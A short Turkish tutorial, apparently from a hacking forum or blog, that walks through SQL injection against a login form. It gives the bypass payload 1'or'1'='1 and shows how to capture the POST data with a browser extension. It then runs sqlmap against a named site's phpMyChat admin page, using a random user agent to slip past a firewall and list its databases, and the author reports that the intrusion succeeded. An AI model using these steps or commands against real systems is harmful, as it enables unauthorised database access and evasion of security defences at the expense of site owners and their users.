Genel de en bilindik sql injection id=1' olur fakat az bilinen çok uygulanan

bir atak daha vardır login kısımlarına uyguladığımız 1'or'1'='1 login bypass

teknikleri vardır aynı açıktan yola çıkarak veritabanına erişmek mümkündür

şöyle ki ;


Şöyle bir login şifre ve kullanıcı adına ' tırnak koyalım ve test edelim


Testimiz başarılı hata mesajı verdirebildik.



Şimdi Mozilla Firefox tarayıcımıza Live HTTP Headers eklentisini yükleyelim

post edilen datayı daha sağlıklı görüp almak için yükledikten sonra

Araçlar kısmından eklentiyi seçelim


 


şimdi Capture seçeneği seçili iken rastgele kullanıcı adı şifre girelim

seçili kısımdaki gibi data çıkacak;

 


    "L=spanish&amp;Link=&amp;LIMIT=&amp;pmc_username=k4y4&amp;pmc_password=k4y4&amp;login_form=Ingresar"

şimdi SQLmap uygulamasını çalıştıralım ve komutumuzu girelim siz komutu girin ben o sırada parametreleri anlatayım; 


    sqlmap -u "http://www.sistemleg.com/phpmychat/admin.php" --data="L=spanish&amp;Link=&amp;LIMIT=&amp;pmc_username=k4y4&amp;pmc_password=k4y4&amp;login_form=Ingresar" -p "pmc_username" --batch --random-agent --dbs 


-u (açığın bulunduğu adres)

--data (açığın post ettiği data live http headers ile aldık)

-p (data için de açığın bulunduğu input name i)

--batch (hızlı bi sonuç için programın seçeneklerini seçer)

--random-agent (güvenlik duvarı aşmak için user agent kullanımı)

--dbs (database's veritabanlarının adını yazdırmak)

Veritabanına sızma işlemi başarı ile gerçekleşti


